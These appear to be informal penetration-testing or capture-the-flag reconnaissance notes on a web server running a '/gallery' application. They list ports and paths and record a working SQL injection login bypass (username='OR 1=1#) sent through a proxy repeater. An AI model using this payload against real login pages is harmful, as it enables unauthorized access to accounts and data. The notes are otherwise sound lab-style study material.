ports:
        80, 8080 - http apache 2.4.29 webserver TCP
        9943 - filtered TCP

paths:
        /gallery/login.php --- login panel, source code contains <a href="forgot-password.html">I forgot my password</a>
        /gallery/dist/ --- files live here
        peculiar code in this file --- if (resp.status == 'success') {location.replace(_base_url_ + 'faculty');


login - holly fuck it worket got succes response on username='OR 1=1#&password= this in repeater
/gallery/uploads/user_1/album_6/ - this is where admin panels end up

